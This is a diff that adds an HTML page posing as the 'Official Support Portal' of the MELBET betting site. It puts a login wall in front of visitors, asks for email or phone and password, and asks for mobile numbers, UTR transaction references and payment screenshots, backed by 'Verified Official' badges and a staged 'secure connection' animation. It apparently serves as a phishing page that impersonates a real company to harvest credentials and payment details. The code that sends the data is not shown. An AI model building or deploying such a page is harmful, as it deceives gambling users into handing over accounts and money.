@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MELBET - Official Support</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpolygon points='12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2' fill='%23FFB800'/%3E%3C/svg%3E">
+</head>
+<body>
+
+<!-- LOADING SCREEN -->
+<div class="loading-screen">
+    <div class="loading-text" style="font-size:32px; font-weight:800;">MEL<span style="color:#FFB800;">BET</span></div>
+    <div class="loading-bar"><div class="loading-bar-inner"></div></div>
+</div>
+
+<!-- LOGIN WALL -->
+<div id="loginWall" class="login-wall">
+    <div class="login-wall-inner">
+        <div class="login-wall-header">
+            <span style="font-size:28px;font-weight:800;">MEL<span style="color:#FFB800;">BET</span></span>
+            <p style="color:rgba(255,255,255,0.4);font-size:14px;margin-top:6px;">Sign in to continue</p>
+        </div>
+        <form id="wallLoginForm" novalidate>
+            <div class="login-methods">
+                <div class="login-method active" data-method="email">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+                    <span>By Email</span>
+                </div>
+                <div class="login-method" data-method="phone">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+                    <span>By Phone</span>
+                </div>
+            </div>
+            <div class="login-form-body" data-method="email">
+                <div class="form-group">
+                    <label class="form-label">E-mail or ID<span class="required">*</span></label>
+                    <input type="email" id="wallEmail" class="form-input" placeholder="Enter your email" required>
+                </div>
+            </div>
+            <div class="login-form-body" data-method="phone" style="display:none;">
+                <div class="form-group">
+                    <label class="form-label">Phone Number<span class="required">*</span></label>
+                    <div class="phone-input-group">
+                        <div class="phone-code">
+                            <img src="https://flagcdn.com/w40/in.png" alt="IN">
+                            <span>+91</span>
+                        </div>
+                        <input type="tel" id="wallPhone" class="form-input" placeholder="Phone number" style="flex:1;" inputmode="numeric" pattern="[0-9]*">
+                    </div>
+                </div>
+            </div>
+            <div class="form-group">
+                <label class="form-label">Password<span class="required">*</span></label>
+                <div class="password-wrapper">
+                    <input type="password" id="wallPassword" class="form-input" placeholder="Enter password" required>
+                    <button type="button" class="password-toggle">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+                    </button>
+                </div>
+            </div>
+            <div class="remember-me">
+                <label>
+                    <input type="checkbox">
+                    Remember me
+                </label>
+            </div>
+            <button type="submit" class="btn btn-primary btn-block btn-premium btn-ripple" style="margin-top:4px;">LOG IN</button>
+        </form>
+        <div class="login-wall-footer">
+            <p>Don't have an account? <a href="#" onclick="document.querySelector('.modal-tab[data-tab=\"register\"]').click();document.getElementById('loginWall').classList.add('hidden');document.querySelector('[data-open-login]').click();return false;">Register</a></p>
+        </div>
+    </div>
+</div>
+
+<!-- HEADER -->
+<header class="header">
+    <button class="menu-btn" aria-label="Menu">
+        <span></span><span></span><span></span>
+    </button>
+    <div class="header-logo">
+        <span class="header-logo-text">MEL<span style="color:var(--primary);">BET</span></span>
+    </div>
+    <div class="header-actions">
+            <a href="#" onclick="if(!localStorage.getItem('melbet_currentUser')){document.querySelector('[data-open-login]').click();return false;}window.open('https://chat-page.edgeone.app','_blank');return false;" class="btn-header btn-header-outline">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+            Chat
+        </a>
+        <button class="btn-header btn-header-primary" data-open-login>
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>
+            Login
+        </button>
+    </div>
+</header>
+
+<!-- SIDEBAR -->
+<div class="sidebar-overlay"></div>
+<aside class="sidebar">
+    <div class="sidebar-header">
+        <h3 style="font-size:24px;">MEL<span style="color:#FFB800;">BET</span></h3>
+        <p>Official Support Portal</p>
+    </div>
+    <nav class="sidebar-nav">
+        <a href="index.html" class="sidebar-nav-item active">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+            Home Page
+        </a>
+        <a href="about.html" class="sidebar-nav-item">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+            About Site
+        </a>
+        <a href="privacy.html" class="sidebar-nav-item">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            Privacy Policy
+        </a>
+        <a href="submit.html" class="sidebar-nav-item">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+            Submit Form
+        </a>
+        <a href="#" onclick="if(!localStorage.getItem('melbet_currentUser')){document.querySelector('[data-open-login]').click();return false;}window.open('https://chat-page.edgeone.app','_blank');return false;" class="sidebar-nav-item">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+            Direct Chat
+        </a>
+
+    </nav>
+    <div class="sidebar-footer">
+        <p>MELBET Official Support Team</p>
+        <p style="margin-top:4px; font-size:11px;">24/7 Available</p>
+    </div>
+</aside>
+
+<!-- MAIN CONTENT -->
+<main class="main-content">
+
+<!-- HERO SECTION -->
+<section class="hero-section">
+    <div class="container">
+        <div class="hero-badge">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+            Official Support Portal
+        </div>
+        <h1 class="hero-title">MELBET<br>Game Support Center</h1>
+        <p class="hero-subtitle">
+            Welcome to the official support site of MELBET GAME. We are dedicated to resolving all your gaming issues including deposit problems, withdrawal issues, and any other game-related concerns. Our expert team is available 24/7 to assist you.
+        </p>
+        <div class="trust-badges">
+            <div class="trust-badge">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+                Verified Official
+            </div>
+            <div class="trust-badge">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                100% Secure
+            </div>
+            <div class="trust-badge">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                24/7 Support
+            </div>
+        </div>
+        <div class="hero-stats">
+            <div class="hero-stat"><div class="hero-stat-number">50K+</div><div class="hero-stat-label">Users Helped</div></div>
+            <div class="hero-stat"><div class="hero-stat-number">99%</div><div class="hero-stat-label">Success Rate</div></div>
+            <div class="hero-stat"><div class="hero-stat-number">24h</div><div class="hero-stat-label">Avg. Response</div></div>
+        </div>
+    </div>
+</section>
+
+<!-- FEATURES SECTION -->
+<section class="features-section">
+    <div class="container">
+        <h2 class="section-title">Our Services</h2>
+        <p class="section-subtitle">Professional support services for all your gaming needs</p>
+        <div class="features-grid">
+            <div class="feature-card">
+                <div class="feature-icon"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg></div>
+                <h3>Deposit Problem Solved</h3>
+                <p>Having trouble with deposits? Our team will verify your payment details and resolve deposit issues within 24 hours. We handle UTR verification and payment proof validation.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
+                <h3>Withdrawal Issue Fixed</h3>
+                <p>Withdrawal stuck or failed? Submit your withdrawal details and our experts will track your transaction and ensure you receive your funds safely.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M6 12h4"/><path d="M8 10v4"/><circle cx="16" cy="12" r="2"/></svg></div>
+                <h3>Game Related Issues</h3>
+                <p>Any other game-related problems? Account issues, login problems, bonus queries - we handle all types of gaming concerns professionally.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg></div>
+                <h3>Fast Resolution</h3>
+                <p>We prioritize quick resolution of all issues. Most problems are resolved within 24 hours with our dedicated support team working round the clock.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
+                <h3>Secure & Trusted</h3>
+                <p>Your data is completely safe with us. We use advanced encryption and never share your personal information with third parties.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg></div>
+                <h3>Mobile Responsive</h3>
+                <p>Access our support portal from any device. Fully optimized for mobile phones, tablets, and desktops for your convenience.</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- GUIDANCE SECTION -->
+<section class="guidance-section">
+    <div class="container">
+        <h2 class="section-title">Problem Resolution Guide</h2>
+        <p class="section-subtitle">Step-by-step guidance to fix your issues</p>
+        <div class="guidance-tabs">
+            <button class="guidance-tab active" data-target="deposit">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/></svg>
+                Deposit Problem
+            </button>
+            <button class="guidance-tab" data-target="withdrawal">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 18 13.5 8.5 8.5 13.5 1 6"/><polyline points="17 18 23 18 23 12"/></svg>
+                Withdrawal Problem
+            </button>
+            <button class="guidance-tab" data-target="other">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+                Other Issues
+            </button>
+        </div>
+
+        <!-- Deposit Guide -->
+        <div class="guidance-content active" data-id="deposit">
+            <div class="guidance-card">
+                <div class="guidance-card-header">
+                    <div class="guidance-card-icon"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg></div>
+                    <div>
+                        <h3>How to Fix Deposit Problems</h3>
+                        <p>Follow these steps to resolve your deposit issues</p>
+                    </div>
+                </div>
+                <ol class="steps-list">
+                    <li class="step-item">
+                        <div class="step-number">1</div>
+                        <div class="step-content">
+                            <h4>Enter Your Username</h4>
+                            <p>Provide your exact MELBET game username for account verification.</p>
+                        </div>
+                    </li>
+                    <li class="step-item">
+                        <div class="step-number">2</div>
+                        <div class="step-content">
+                            <h4>Enter Mobile Number</h4>
+                            <p>Share your registered mobile number linked to your gaming account.</p>
+                        </div>
+                    </li>
+                    <li class="step-item">
+                        <div class="step-number">3</div>
+                        <div class="step-content">
+                            <h4>Enter Email ID</h4>
+                            <p>Provide your registered email address for communication.</p>
+                        </div>
+                    </li>
+                    <li class="step-item">
+                        <div class="step-number">4</div>
+                        <div class="step-content">
+                            <h4>Enter Deposit Amount</h4>
+                            <p>Mention the exact amount you tried to deposit.</p>
+                        </div>
+                    </li>
+                    <li class="step-item">
+                        <div class="step-number">5</div>
+                        <div class="step-content">
+                            <h4>Enter UTR Number</h4>
+                            <p>Provide the UTR (Unique Transaction Reference) number from your payment.</p>
+                        </div>
+                    </li>
+                    <li class="step-item">
+                        <div class="step-number">6</div>
+                        <div class="step-content">
+                            <h4>Upload Payment Screenshot</h4>
+                            <p>Upload a clear image of your payment receipt or screenshot as proof.</p>
+                        </div>
+                    </li>
+                </ol>
+                <div style="margin-top: 24px; text-align: center;">
+                    <a href="submit.html" class="btn btn-primary btn-lg btn-premium">
+                        Submit Deposit Issue
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Withdrawal Guide -->
+        <div class="guidance-content" data-id="withdrawal">
+            <div class="guidance-card">
+                <div class="guidance-card-header">
+                    <div class="guidance-card-icon"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
+                    <div>
+                        <h3>How to Fix Withdrawal Problems</h3>
+                        <p>Follow these steps to resolve your withdrawal issues</p>
+                    </div>
+                </div>
+                <ol class="steps-list">
+                    <li class="step-item">
+                        <div class="step-number">1</div>
+                        <div class="step-content">
+                            <h4>Enter Your Username</h4>
+                            <p>Provide your exact MELBET game username for account verification.</p>
+                        </div>
+                    </li>
+                    <li class="step-item">
+                        <div class="step-number">2</div>
+                        <div class="step-content">
+                            <h4>Enter Mobile Number</h4>
+                            <p>Share your registered mobile number linked to your gaming account.</p>
+                        </div>
+                    </li>
+                    <li class="step-item">
+                        <div class="step-number">3</div>
+                        <div class="step-content">
+                            <h4>Enter Email ID</h4>
+                            <p>Provide your registered email address for communication.</p>
+                        </div>
+                    </li>
+                    <li class="step-item">
+                        <div class="step-number">4</div>
+                        <div class="step-content">
+                            <h4>Enter Deposit Amount</h4>
+                            <p>Mention your total deposit amount in the game.</p>
+                        </div>
+                    </li>
+                    <li class="step-item">
+                        <div class="step-number">5</div>
+                        <div class="step-content">
+                            <h4>Enter Withdrawal Amount</h4>
+                            <p>Mention the exact amount you are trying to withdraw.</p>
+                        </div>
+                    </li>
+                    <li class="step-item">
+                        <div class="step-number">6</div>
+                        <div class="step-content">
+                            <h4>Upload Withdrawal Issue Screenshot</h4>
+                            <p>Upload a clear screenshot showing the withdrawal error or pending status.</p>
+                        </div>
+                    </li>
+                </ol>
+                <div style="margin-top: 24px; text-align: center;">
+                    <a href="submit.html" class="btn btn-primary btn-lg btn-premium">
+                        Submit Withdrawal Issue
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Other Issues Guide -->
+        <div class="guidance-content" data-id="other">
+            <div class="guidance-card">
+                <div class="guidance-card-header">
+                    <div class="guidance-card-icon"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M6 12h4"/><path d="M8 10v4"/><circle cx="16" cy="12" r="2"/></svg></div>
+                    <div>
+                        <h3>How to Fix Other Game Issues</h3>
+                        <p>Follow these steps for any other game-related problems</p>
+                    </div>
+                </div>
+                <ol class="steps-list">
+                    <li class="step-item">
+                        <div class="step-number">1</div>
+                        <div class="step-content">
+                            <h4>Enter Your Username</h4>
+                            <p>Provide your exact MELBET game username.</p>
+                        </div>
+                    </li>
+                    <li class="step-item">
+                        <div class="step-number">2</div>
+                        <div class="step-content">
+                            <h4>Enter Mobile Number</h4>
+                            <p>Share your registered mobile number for verification.</p>
+                        </div>
+                    </li>
+                    <li class="step-item">
+                        <div class="step-number">3</div>
+                        <div class="step-content">
+                            <h4>Enter Email ID</h4>
+                            <p>Provide your registered email address.</p>
+                        </div>
+                    </li>
+                    <li class="step-item">
+                        <div class="step-number">4</div>
+                        <div class="step-content">
+                            <h4>Describe Your Issue</h4>
+                            <p>Write a detailed description of the problem you are facing in the game.</p>
+                        </div>
+                    </li>
+                    <li class="step-item">
+                        <div class="step-number">5</div>
+                        <div class="step-content">
+                            <h4>Upload Issue Screenshot</h4>
+                            <p>Upload any relevant screenshots that help explain your issue.</p>
+                        </div>
+                    </li>
+                </ol>
+                <div style="margin-top: 24px; text-align: center;">
+                    <a href="submit.html" class="btn btn-primary btn-lg btn-premium">
+                        Submit Issue
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- CTA SECTION -->
+<section class="cta-section">
+    <div class="container">
+        <div class="cta-card">
+            <h2>Ready to Fix Your Issue?</h2>
+            <p>Submit your problem now and our support team will resolve it as quickly as possible. We are here to help you 24/7.</p>
+            <div class="cta-buttons">
+                <a href="submit.html" class="btn btn-primary btn-lg btn-premium">
+                    Submit Form
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+                </a>
+                <a href="#" onclick="if(!localStorage.getItem('melbet_currentUser')){document.querySelector('[data-open-login]').click();return false;}window.open('https://chat-page.edgeone.app','_blank');return false;" class="btn btn-secondary btn-lg">
+                    Direct Chat
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+                </a>
+            </div>
+        </div>
+    </div>
+</section>
+
+</main>
+
+<!-- FOOTER -->
+<footer class="footer">
+    <div class="container">
+        <div class="footer-content">
+            <div class="footer-brand">
+                <h4>MELBET</h4>
+                <p>Official Support Portal for MELBET GAME. We provide professional assistance for all your gaming needs.</p>
+            </div>
+            <div class="footer-links">
+                <h4>Quick Links</h4>
+                <ul>
+                    <li><a href="index.html">Home</a></li>
+                    <li><a href="about.html">About Site</a></li>
+                    <li><a href="privacy.html">Privacy Policy</a></li>
+                    <li><a href="submit.html">Submit Form</a></li>
+                </ul>
+            </div>
+            <div class="footer-links">
+                <h4>Support</h4>
+                <ul>
+                    <li><a href="submit.html">Deposit Issues</a></li>
+                    <li><a href="submit.html">Withdrawal Issues</a></li>
+                    <li><a href="submit.html">Other Problems</a></li>
+                    <li><a href="#" onclick="if(!localStorage.getItem('melbet_currentUser')){document.querySelector('[data-open-login]').click();return false;}window.open('https://chat-page.edgeone.app','_blank');return false;">Live Chat</a></li>
+                </ul>
+            </div>
+            <div class="footer-links">
+                <h4>Contact</h4>
+                <ul>
+                    <li><a href="#">support@melbetstar.com</a></li>
+                    <li><a href="#">24/7 Available</a></li>
+                    <li><a href="#">Official Support Team</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>MELBET Official Support Team. All rights reserved.</p>
+        </div>
+    </div>
+</footer>
+
+<!-- LOGIN MODAL -->
+<div class="modal-overlay login-modal">
+    <div class="modal">
+        <div class="modal-header">
+            <div class="modal-logo">
+                <span style="font-size:24px; font-weight:800;">MEL<span style="color:#FFB800;">BET</span></span>
+            </div>
+            <div class="modal-tabs">
+                <button class="modal-tab active" data-tab="login">Log In</button>
+                <button class="modal-tab" data-tab="register">Register</button>
+            </div>
+        </div>
+        <div class="modal-body">
+            <form id="loginForm" class="modal-form" novalidate>
+                <div class="login-methods">
+                    <div class="login-method active" data-method="email">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+                        <span>By Email</span>
+                    </div>
+                    <div class="login-method" data-method="phone">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+                        <span>By Phone</span>
+                    </div>
+                </div>
+                <div class="login-form-body" data-method="email">
+                    <div class="form-group">
+                        <label class="form-label">E-mail or ID<span class="required">*</span></label>
+                        <input type="email" id="loginEmail" class="form-input" placeholder="Enter your email" required>
+                    </div>
+                </div>
+                <div class="login-form-body" data-method="phone" style="display:none;">
+                    <div class="form-group">
+                        <label class="form-label">Phone Number<span class="required">*</span></label>
+                        <div class="phone-input-group">
+                            <div class="phone-code">
+                                <img src="https://flagcdn.com/w40/in.png" alt="IN">
+                                <span>+91</span>
+                            </div>
+                            <input type="tel" id="loginPhone" class="form-input" placeholder="Phone number" style="flex:1;" inputmode="numeric" pattern="[0-9]*">
+                        </div>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Password<span class="required">*</span></label>
+                    <div class="password-wrapper">
+                        <input type="password" id="loginPassword" class="form-input" placeholder="Enter password" required>
+                        <button type="button" class="password-toggle">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+                        </button>
+                    </div>
+                </div>
+                <div class="remember-me">
+                    <label>
+                        <input type="checkbox">
+                        Remember me
+                    </label>
+                </div>
+                <button type="submit" class="btn btn-primary btn-block btn-premium btn-ripple" style="margin-top:8px;">
+                    LOG IN
+                </button>
+            </form>
+            <form id="registerForm" class="modal-form" style="display:none;" novalidate>
+                <div class="form-group">
+                    <label class="form-label">Full Name<span class="required">*</span></label>
+                    <input type="text" id="regName" class="form-input" placeholder="Enter your full name" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Email ID<span class="required">*</span></label>
+                    <input type="email" id="regEmail" class="form-input" placeholder="Enter your email" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Mobile Number<span class="required">*</span></label>
+                    <div class="phone-input-group">
+                        <div class="phone-code">
+                            <img src="https://flagcdn.com/w40/in.png" alt="IN">
+                            <span>+91</span>
+                        </div>
+                        <input type="tel" id="regPhone" class="form-input" placeholder="Phone number" style="flex:1;" inputmode="numeric" pattern="[0-9]*" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Password<span class="required">*</span></label>
+                    <div class="password-wrapper">
+                        <input type="password" id="regPassword" class="form-input" placeholder="Create password" required>
+                        <button type="button" class="password-toggle">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+                        </button>
+                    </div>
+                </div>
+                <button type="submit" class="btn btn-primary btn-block btn-premium btn-ripple" style="margin-top:8px;">
+                    REGISTER
+                </button>
+            </form>
+        </div>
+        <div class="modal-footer">
+            <p>Don't have an account? <a href="#" data-switch-tab="register">Register</a></p>
+        </div>
+    </div>
+</div>
+
+<!-- VERIFICATION OVERLAY -->
+<div class="verify-overlay" id="verifyOverlay">
+    <div class="verify-card">
+        <div class="verify-ring-wrap">
+            <svg width="120" height="120" viewBox="0 0 120 120">
+                <circle cx="60" cy="60" r="52" fill="none" stroke="rgba(255,255,255,0.06)" stroke-width="6"/>
+                <circle id="vRing" cx="60" cy="60" r="52" fill="none" stroke="#FFB800" stroke-width="6" stroke-linecap="round" stroke-dasharray="326.7" stroke-dashoffset="326.7" transform="rotate(-90 60 60)"/>
+            </svg>
+            <div class="verify-icon-area">
+                <svg id="vShield" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#FFB800" stroke-width="1.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                <svg id="vCheck" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#34C759" stroke-width="3" style="display:none;"><polyline points="8 12 11 15 16 9"/></svg>
+            </div>
+        </div>
+        <div class="verify-status-text" id="vStatus">Initializing secure connection...</div>
+        <div class="verify-bar-track"><div class="verify-bar-fill" id="vBarFill"></div></div>
+    </div>
+</div>
+
+<!-- SUCCESS POPUP -->
+<div class="success-popup">
+    <div class="success-content">
+        <div class="success-icon">&#10003;</div>
+        <h3>Success!</h3>
+        <p>Your request has been submitted successfully.</p>
+        <button class="btn btn-success btn-block" onclick="document.querySelector('.success-popup').classList.remove('open')" style="margin-top:8px;">
+            OK, Got It!
+        </button>
+    </div>
+</div>
+
+<script src="app.js"></script>
+<script>
+$$('.modal-tab').forEach(tab => {
+    tab.addEventListener('click', () => {
+        const target = tab.dataset.tab;
+        $$('.modal-tab').forEach(t => t.classList.remove('active'));
+        tab.classList.add('active');
+        if (target === 'login') {
+            document.getElementById('loginForm').style.display = 'block';
+            document.getElementById('registerForm').style.display = 'none';
+        } else {
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('registerForm').style.display = 'block';
+        }
+    });
+});
+$$('[data-switch-tab]').forEach(link => {
+    link.addEventListener('click', (e) => {
+        e.preventDefault();
+        const target = link.dataset.switchTab;
+        const tab = document.querySelector('.modal-tab[data-tab="' + target + '"]');
+        if (tab) tab.click();
+    });
+});
+</script>
+
+</body>
+</html>
